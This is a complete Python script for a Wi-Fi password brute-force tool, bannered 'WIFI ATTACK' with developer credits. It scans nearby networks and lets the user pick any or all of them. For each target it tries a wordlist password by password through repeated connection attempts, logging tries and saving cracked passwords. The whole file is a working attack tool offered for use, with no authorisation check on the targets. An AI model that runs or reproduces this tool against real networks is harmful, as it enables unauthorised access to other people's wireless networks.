#!/usr/bin/env python3
import os
import platform
import sys
import argparse
import signal
import time
import json
from datetime import datetime
from pathlib import Path
from typing import List
try:
    import pywifi
    from pywifi import const
except ImportError:
    print("Installing required dependencies...")
    install_result = os.system("pip install pywifi")
    if install_result != 0:
        print("Failed to install pywifi. Please install it manually: pip install pywifi")
        sys.exit(1)
    print("pywifi installed. Restarting script...")
    os.execv(sys.executable, [sys.executable] + sys.argv)
if platform.system() == "Windows":
    try:
        import comtypes
    except ImportError:
        print("Installing comtypes (required by pywifi on Windows)...")
        os.system("pip install comtypes")
        print("Please restart the script manually.")
        sys.exit(0)
try:
    from rich.console import Console
    from rich.progress import Progress, TextColumn, BarColumn, TimeElapsedColumn
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("For enhanced UI, install rich: pip install rich")
if RICH_AVAILABLE:
    console = Console()
    class Colors:
        RED = "[red]"
        GREEN = "[green]"
        YELLOW = "[yellow]"
        CYAN = "[cyan]"
        RESET = "[/]"
    c = Colors()
    def sprint(text):
        console.print(text)
else:
    class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        CYAN = '\033[96m'
        RESET = '\033[0m'
    c = Colors()
    def sprint(text):
        print(text)
DEFAULT_WORDLIST = "passwords.txt"
RESULTS_DIR = "results"
TIMEOUT_SECONDS = 15
os.makedirs(RESULTS_DIR, exist_ok=True)
class WiFiScanner:
    def __init__(self, interface_index=0):
        try:
            self.wifi = pywifi.PyWiFi()
            interfaces = self.wifi.interfaces()
            if not interfaces:
                sprint(f"{c.RED}No wireless interfaces found!{c.RESET}")
                if platform.system() == "Windows":
                    sprint(f"{c.YELLOW}Please make sure your Wi-Fi is turned on and working.{c.RESET}")
                    sprint(f"{c.YELLOW}You may need to run this script as administrator.{c.RESET}")
                else:
                    sprint(f"{c.YELLOW}Please make sure your Wi-Fi is turned on and you have proper permissions.{c.RESET}")
                sys.exit(1)
            sprint(f"{c.GREEN}Available wireless interfaces:{c.RESET}")
            for i, interface in enumerate(interfaces):
                sprint(f"{c.CYAN}{i}: {interface.name()}{c.RESET}")
            try:
                self.interface = interfaces[interface_index]
                sprint(f"{c.GREEN}Using interface: {self.interface.name()}{c.RESET}")
            except IndexError:
                sprint(f"{c.RED}Interface index {interface_index} is out of range!{c.RESET}")
                sprint(f"{c.YELLOW}Using default interface (0) instead.{c.RESET}")
                self.interface = interfaces[0]
        except Exception as e:
            sprint(f"{c.RED}Error initializing WiFi: {str(e)}{c.RESET}")
            if "PyWiFi only supports Linux and Windows platforms" in str(e):
                sprint(f"{c.RED}This script only works on Windows and Linux platforms.{c.RESET}")
            elif platform.system() == "Windows":
                sprint(f"{c.YELLOW}On Windows, make sure you have the correct WLAN AutoConfig service running:{c.RESET}")
                sprint(f"{c.YELLOW}1. Press Win+R, type 'services.msc' and press Enter{c.RESET}")
                sprint(f"{c.YELLOW}2. Find 'WLAN AutoConfig' and ensure it's running{c.RESET}")
                sprint(f"{c.YELLOW}3. Also ensure your wireless adapter is enabled{c.RESET}")
            sys.exit(1)
        self.successful_attempts = {}
        self.attempted_passwords = set()
        self.running = True
        self.scan_results = []
        self.load_previous_attempts()
    def load_previous_attempts(self):
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        if os.path.exists(success_file):
            try:
                with open(success_file, 'r') as f:
                    self.successful_attempts = json.load(f)
                sprint(f"{c.GREEN}Loaded {len(self.successful_attempts)} previously cracked networks{c.RESET}")
            except (json.JSONDecodeError, IOError):
                sprint(f"{c.YELLOW}Warning: Could not read previous successful attempts{c.RESET}")
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        if os.path.exists(attempts_file):
            try:
                with open(attempts_file, 'r') as f:
                    for line in f:
                        if '--' in line:
                            network, password = line.strip().split('--', 1)
                            self.attempted_passwords.add(f"{network}--{password}")
                sprint(f"{c.GREEN}Loaded {len(self.attempted_passwords)} previously attempted combinations{c.RESET}")
            except IOError:
                sprint(f"{c.YELLOW}Warning: Could not read previous attempt log{c.RESET}")
    def save_successful_attempt(self, network, password):
        self.successful_attempts[network] = {"password": password, "timestamp": datetime.now().isoformat()}
        success_file = os.path.join(RESULTS_DIR, "successful_cracks.json")
        try:
            with open(success_file, 'w') as f:
                json.dump(self.successful_attempts, f, indent=2)
        except IOError:
            sprint(f"{c.YELLOW}Warning: Could not save successful attempt{c.RESET}")
    def log_attempt(self, network, password):
        attempt_key = f"{network}--{password}"
        self.attempted_passwords.add(attempt_key)
        attempts_file = os.path.join(RESULTS_DIR, "attempted_combinations.txt")
        try:
            with open(attempts_file, 'a') as f:
                f.write(f"{attempt_key}\n")
        except IOError:
            pass
    def scan_networks(self) -> List[pywifi.Profile]:
        sprint(f"{c.CYAN}Scanning for Wi-Fi networks...{c.RESET}")
        try:
            if self.interface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                sprint(f"{c.YELLOW}Ensuring interface is activated...{c.RESET}")
                if platform.system() == "Windows":
                    try:
                        self.interface.disconnect()
                        time.sleep(1)
                    except:
                        pass
            self.interface.scan()
            scan_wait_time = 4 if platform.system() == "Windows" else 2
            sprint(f"{c.CYAN}Waiting {scan_wait_time} seconds for scan to complete...{c.RESET}")
            time.sleep(scan_wait_time)
            seen_ssids = set()
            unique_networks = []
            try:
                all_results = self.interface.scan_results()
                if not all_results:
                    sprint(f"{c.YELLOW}No networks found in scan. This may be due to:{c.RESET}")
                    sprint(f"{c.YELLOW}1. Wi-Fi adapter is disabled or in power-saving mode{c.RESET}")
                    sprint(f"{c.YELLOW}2. Insufficient permissions (try running as admin/root){c.RESET}")
                    sprint(f"{c.YELLOW}3. No networks in range{c.RESET}")
                    return []
                all_results.sort(key=lambda x: getattr(x, 'signal', 0), reverse=True)
                for network in all_results:
                    if hasattr(network, 'ssid') and network.ssid and network.ssid.strip():
                        if network.ssid not in seen_ssids:
                            seen_ssids.add(network.ssid)
                            unique_networks.append(network)
                    elif hasattr(network, 'bssid') and network.bssid:
                        if network.bssid not in seen_ssids:
                            seen_ssids.add(network.bssid)
                            network.ssid = f"<Hidden Network: {network.bssid}>"
                            unique_networks.append(network)
            except Exception as e:
                sprint(f"{c.RED}Error getting scan results: {str(e)}{c.RESET}")
                if platform.system() == "Windows":
                    sprint(f"{c.YELLOW}On Windows, this might be due to the WLAN service not responding.{c.RESET}")
                    sprint(f"{c.YELLOW}Try restarting the 'WLAN AutoConfig' service.{c.RESET}")
                return []
            self.scan_results = unique_networks
            return unique_networks
        except Exception as e:
            sprint(f"{c.RED}Error during network scan: {str(e)}{c.RESET}")
            if "You must specify profile attributes such as auth, cipher and ssid" in str(e):
                sprint(f"{c.YELLOW}This might be a compatibility issue with your Wi-Fi adapter drivers.{c.RESET}")
            elif "The system cannot find the file specified" in str(e) and platform.system() == "Windows":
                sprint(f"{c.YELLOW}This might be due to an issue with the Windows WLAN API.{c.RESET}")
                sprint(f"{c.YELLOW}Try restarting the 'WLAN AutoConfig' service.{c.RESET}")
            return []
    def test_password(self, network, password, timeout=TIMEOUT_SECONDS) -> bool:
        attempt_key = f"{network.ssid}--{password}"
        if attempt_key in self.attempted_passwords:
            return False
        self.log_attempt(network.ssid, password)
        try:
            profile = pywifi.Profile()
            profile.ssid = network.ssid
            profile.akm = []
            auth_types = [const.AUTH_ALG_OPEN]
            if hasattr(network, 'akm') and network.akm:
                akm_types = network.akm
            else:
                akm_types = [const.AKM_TYPE_WPA2PSK]
                if platform.system() != "Windows":
                    akm_types.extend([const.AKM_TYPE_WPAPSK, const.AKM_TYPE_WPA2PSK])
            profile.auth = auth_types[0]
            for akm_type in akm_types:
                profile.akm.append(akm_type)
            if const.AKM_TYPE_WPA2PSK in akm_types:
                profile.cipher = const.CIPHER_TYPE_CCMP
            else:
                profile.cipher = const.CIPHER_TYPE_TKIP
            profile.key = password
            try:
                self.interface.remove_all_network_profiles()
            except Exception as e:
                sprint(f"{c.YELLOW}Warning: Could not remove existing profiles: {str(e)}{c.RESET}")
            try:
                temp_profile = self.interface.add_network_profile(profile)
            except Exception as e:
                if "You must specify profile attributes" in str(e):
                    sprint(f"{c.YELLOW}Retrying with alternate profile configuration...{c.RESET}")
                    profile = pywifi.Profile()
                    profile.ssid = network.ssid
                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm = []
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    try:
                        temp_profile = self.interface.add_network_profile(profile)
                    except Exception as inner_e:
                        sprint(f"{c.RED}Error creating network profile: {str(inner_e)}{c.RESET}")
                        return False
                else:
                    sprint(f"{c.RED}Error adding network profile: {str(e)}{c.RESET}")
                    return False
            try:
                self.interface.connect(temp_profile)
            except Exception as e:
                sprint(f"{c.RED}Error connecting to network: {str(e)}{c.RESET}")
                return False
            start_time = time.time()
            connection_successful = False
            while time.time() - start_time < timeout:
                try:
                    status = self.interface.status()
                    if status == const.IFACE_CONNECTED:
                        connection_successful = True
                        break
                    elif status == const.IFACE_DISCONNECTED:
                        break
                except Exception as e:
                    sprint(f"{c.YELLOW}Error checking connection status: {str(e)}{c.RESET}")
                    break
                time.sleep(0.5)
            try:
                self.interface.disconnect()
            except Exception as e:
                sprint(f"{c.YELLOW}Error disconnecting: {str(e)}{c.RESET}")
            return connection_successful
        except Exception as e:
            sprint(f"{c.RED}Error during password attempt: {str(e)}{c.RESET}")
            try:
                self.interface.disconnect()
            except:
                pass
            return False
    def crack_network(self, network, passwords: List[str], progress_callback=None):
        if network.ssid in self.successful_attempts:
            sprint(f"{c.GREEN}Network {network.ssid} already cracked: {self.successful_attempts[network.ssid]['password']}{c.RESET}")
            return True, self.successful_attempts[network.ssid]['password']
        total_passwords = len(passwords)
        for i, password in enumerate(passwords):
            if progress_callback:
                progress_callback(i, total_passwords)
            if len(password) < 8 or not all(32 <= ord(ch) < 127 for ch in password):
                continue
            sprint(f"{c.YELLOW}Trying {network.ssid} with password: {password} [{i+1}/{total_passwords}]{c.RESET}")
            if self.test_password(network, password):
                sprint(f"{c.GREEN}PASSWORD FOUND for {network.ssid}: {password}{c.RESET}")
                self.save_successful_attempt(network.ssid, password)
                return True, password
            if not self.running:
                return False, None
        return False, None
def display_banner():
    banner = """
    ██╗    ██╗██╗███████╗██╗      ██████╗██████╗  █████╗  ██████╗██╗  ██╗
    ██║    ██║██║██╔════╝██║     ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
    ██║ █╗ ██║██║█████╗  ██║     ██║     ██████╔╝███████║██║     █████╔╝ 
    ██║███╗██║██║██╔══╝  ██║     ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
    ╚███╔███╔╝██║██║     ███████╗╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
     ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
    
    WIFI ATTACK
    Credits: Telegram @Asqlan - @MLBOR | GitHub: rave-ns
    """
    if RICH_AVAILABLE:
        console.print(banner, style="bold blue")
    else:
        print(banner)
def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
def check_privileges():
    current_system = platform.system()
    if current_system == "Windows":
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                sprint(f"{c.YELLOW}Warning: Not running as administrator. Some features may not work.{c.RESET}")
                sprint(f"{c.YELLOW}For best results, run this script as administrator.{c.RESET}")
                choice = input("Continue anyway? (y/n): ").lower()
                return choice in ('y', 'yes')
        except:
            pass
        return True
    elif current_system == "Linux":
        try:
            if os.geteuid() != 0:
                sprint(f"{c.RED}This script requires root privileges on Linux.{c.RESET}")
                sprint(f"{c.YELLOW}Please run with sudo: sudo python3 {sys.argv[0]}{c.RESET}")
                return False
        except AttributeError:
            sprint(f"{c.YELLOW}Could not check privileges. Make sure you run this as root/admin.{c.RESET}")
        return True
    elif current_system == "Darwin":
        try:
            if os.geteuid() != 0:
                sprint(f"{c.RED}This script requires root privileges on macOS.{c.RESET}")
                sprint(f"{c.YELLOW}Please run with sudo: sudo python3 {sys.argv[0]}{c.RESET}")
                return False
        except AttributeError:
            sprint(f"{c.YELLOW}Could not check privileges. Make sure you run this as root/admin.{c.RESET}")
        return True
    return True
def signal_handler(signum, frame):
    print("\nCancelling... (This may take a moment to disconnect from any networks)")
    scanner.running = False
def parse_arguments():
    parser = argparse.ArgumentParser(description="Advanced Wi-Fi Password Brute Force Tool")
    parser.add_argument('-w', '--wordlist', type=str, default=DEFAULT_WORDLIST, help=f'Path to password wordlist (default: {DEFAULT_WORDLIST})')
    parser.add_argument('-t', '--timeout', type=int, default=TIMEOUT_SECONDS, help=f'Connection attempt timeout in seconds (default: {TIMEOUT_SECONDS})')
    parser.add_argument('-i', '--interface', type=int, default=0, help='Wireless interface index to use (default: 0)')
    parser.add_argument('-n', '--network', type=str, help='Target specific network SSID (optional)')
    return parser.parse_args()
def load_passwords(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        sprint(f"{c.GREEN}Loaded {len(passwords)} passwords from {wordlist_path}{c.RESET}")
        return passwords
    except FileNotFoundError:
        sprint(f"{c.RED}Error: Wordlist file '{wordlist_path}' not found{c.RESET}")
        sys.exit(1)
    except IOError:
        sprint(f"{c.RED}Error: Could not read wordlist file '{wordlist_path}'{c.RESET}")
        sys.exit(1)
def crack_all_networks(scanner, networks, passwords, args):
    if RICH_AVAILABLE:
        with Progress(TextColumn("[bold blue]{task.description}"), BarColumn(), TextColumn("[bold green]{task.completed}/{task.total}"), TextColumn("[yellow]{task.fields[password]}"), TimeElapsedColumn()) as progress:
            for network in networks:
                task_id = progress.add_task(f"Cracking {network.ssid}", total=len(passwords), password="")
                def update_progress(current, total):
                    if current < len(passwords):
                        progress.update(task_id, completed=current, password=passwords[current])
                success, password = scanner.crack_network(network, passwords, update_progress)
                if success:
                    progress.update(task_id, description=f"[green]CRACKED: {network.ssid} → {password}")
                else:
                    progress.update(task_id, description=f"[red]FAILED: {network.ssid}")
    else:
        for network in networks:
            sprint(f"{c.CYAN}Attempting to crack: {network.ssid}{c.RESET}")
            success, password = scanner.crack_network(network, passwords)
            if success:
                sprint(f"{c.GREEN}CRACKED: {network.ssid} → {password}{c.RESET}")
            else:
                sprint(f"{c.RED}FAILED: Could not crack {network.ssid}{c.RESET}")
def test_pywifi_functionality():
    sprint(f"{c.CYAN}Testing pywifi functionality...{c.RESET}")
    try:
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()
        if not interfaces:
            sprint(f"{c.RED}No wireless interfaces detected!{c.RESET}")
            if platform.system() == "Windows":
                sprint(f"{c.YELLOW}Possible solutions for Windows:{c.RESET}")
                sprint(f"{c.YELLOW}1. Make sure Wi-Fi is enabled in Windows settings{c.RESET}")
                sprint(f"{c.YELLOW}2. Run as Administrator{c.RESET}")
                sprint(f"{c.YELLOW}3. Make sure WLAN AutoConfig service is running{c.RESET}")
                sprint(f"{c.YELLOW}4. Update your wireless adapter drivers{c.RESET}")
            else:
                sprint(f"{c.YELLOW}Possible solutions for Linux:{c.RESET}")
                sprint(f"{c.YELLOW}1. Make sure Wi-Fi is enabled{c.RESET}")
                sprint(f"{c.YELLOW}2. Run with sudo privileges{c.RESET}")
                sprint(f"{c.YELLOW}3. Make sure compatible wireless adapter is present{c.RESET}")
            return False
        interface = interfaces[0]
        try:
            status = interface.status()
            sprint(f"{c.GREEN}Interface status: {status}{c.RESET}")
            sprint(f"{c.CYAN}Testing scan functionality...{c.RESET}")
            interface.scan()
            time.sleep(2)
            results = interface.scan_results()
            if results:
                sprint(f"{c.GREEN}Scan successful! Found {len(results)} networks.{c.RESET}")
            else:
                sprint(f"{c.YELLOW}Scan completed but no networks found.{c.RESET}")
                sprint(f"{c.YELLOW}This could be normal if no networks are in range.{c.RESET}")
            return True
        except Exception as e:
            sprint(f"{c.RED}Error testing interface operations: {str(e)}{c.RESET}")
            if platform.system() == "Windows" and "failed" in str(e).lower():
                sprint(f"{c.YELLOW}This might be due to Windows-specific issues with pywifi.{c.RESET}")
                sprint(f"{c.YELLOW}Try running as administrator or updating your wireless drivers.{c.RESET}")
            return False
    except Exception as e:
        sprint(f"{c.RED}Error initializing pywifi: {str(e)}{c.RESET}")
        return False
def main():
    clear_screen()
    display_banner()
    if not check_privileges():
        return
    args = parse_arguments()
    signal.signal(signal.SIGINT, signal_handler)
    if not test_pywifi_functionality():
        sprint(f"{c.RED}pywifi functionality test failed. The script may not work correctly.{c.RESET}")
        proceed = input(f"{c.YELLOW}Do you want to continue anyway? (y/n): {c.RESET}").lower()
        if proceed not in ('y', 'yes'):
            sprint(f"{c.YELLOW}Operation cancelled by user.{c.RESET}")
            return
    passwords = load_passwords(args.wordlist)
    global scanner
    try:
        scanner = WiFiScanner(interface_index=args.interface)
    except Exception as e:
        sprint(f"{c.RED}Failed to initialize WiFi scanner: {str(e)}{c.RESET}")
        return
    sprint(f"{c.CYAN}Scanning for networks...{c.RESET}")
    networks = scanner.scan_networks()
    if not networks:
        sprint(f"{c.RED}No Wi-Fi networks found!{c.RESET}")
        if platform.system() == "Windows":
            sprint(f"{c.YELLOW}This could be due to:{c.RESET}")
            sprint(f"{c.YELLOW}1. Windows restricting access to Wi-Fi scanning{c.RESET}")
            sprint(f"{c.YELLOW}2. Wi-Fi adapter is in power saving mode{c.RESET}")
            sprint(f"{c.YELLOW}3. No networks actually in range{c.RESET}")
            sprint(f"{c.YELLOW}Try running as administrator or checking Wi-Fi status in Windows.{c.RESET}")
        return
    if args.network:
        filtered_networks = [n for n in networks if args.network.lower() in n.ssid.lower()]
        if not filtered_networks:
            sprint(f"{c.RED}Network '{args.network}' not found!{c.RESET}")
            sprint(f"{c.YELLOW}Available networks:{c.RESET}")
            for i, network in enumerate(networks[:10]):
                sprint(f"{c.YELLOW}{i+1}. {network.ssid}{c.RESET}")
            if len(networks) > 10:
                sprint(f"{c.YELLOW}...and {len(networks)-10} more{c.RESET}")
            return
        networks = filtered_networks
    sprint(f"{c.GREEN}Found {len(networks)} networks:{c.RESET}")
    for i, network in enumerate(networks):
        if network.ssid in scanner.successful_attempts:
            status = f"{c.GREEN}[CRACKED: {scanner.successful_attempts[network.ssid]['password']}]{c.RESET}"
        else:
            status = f"{c.YELLOW}[NOT CRACKED]{c.RESET}"
        signal_str = f", Signal: {network.signal}dBm" if hasattr(network, 'signal') else ""
        sprint(f"{i+1}. {c.CYAN}{network.ssid}{c.RESET} {status}{signal_str}")
    if not args.network:
        while True:
            choice = input(f"{c.YELLOW}Enter the numbers of networks to crack (comma-separated) or 'all' for all: {c.RESET}")
            if choice.lower() == 'all':
                break
            try:
                indices = [int(x.strip()) - 1 for x in choice.split(',')]
                if all(0 <= idx < len(networks) for idx in indices):
                    networks = [networks[idx] for idx in indices]
                    break
                else:
                    sprint(f"{c.RED}Invalid selection! Please enter numbers between 1 and {len(networks)}.{c.RESET}")
            except ValueError:
                sprint(f"{c.RED}Invalid input! Please enter numbers separated by commas.{c.RESET}")
    sprint(f"{c.GREEN}Ready to start cracking {len(networks)} networks with {len(passwords)} passwords.{c.RESET}")
    if input(f"{c.YELLOW}Continue? (y/n): {c.RESET}").lower() not in ('y', 'yes'):
        sprint(f"{c.YELLOW}Operation cancelled by user.{c.RESET}")
        return
    sprint(f"{c.GREEN}Starting password cracking...{c.RESET}")
    crack_all_networks(scanner, networks, passwords, args)
    sprint(f"{c.GREEN}=== Final Report ==={c.RESET}")
    if scanner.successful_attempts:
        sprint(f"{c.GREEN}Successfully cracked {len(scanner.successful_attempts)} networks:{c.RESET}")
        for ssid, data in scanner.successful_attempts.items():
            timestamp = datetime.fromisoformat(data['timestamp'])
            sprint(f"{c.GREEN}- {ssid}: {data['password']} (cracked on {timestamp.strftime('%Y-%m-%d %H:%M:%S')}){c.RESET}")
    else:
        sprint(f"{c.RED}No networks were successfully cracked.{c.RESET}")
    sprint(f"{c.YELLOW}Attempted {len(scanner.attempted_passwords)} password combinations.{c.RESET}")
    sprint(f"{c.GREEN}Results saved to {RESULTS_DIR} directory.{c.RESET}")
if __name__ == "__main__":
    main()
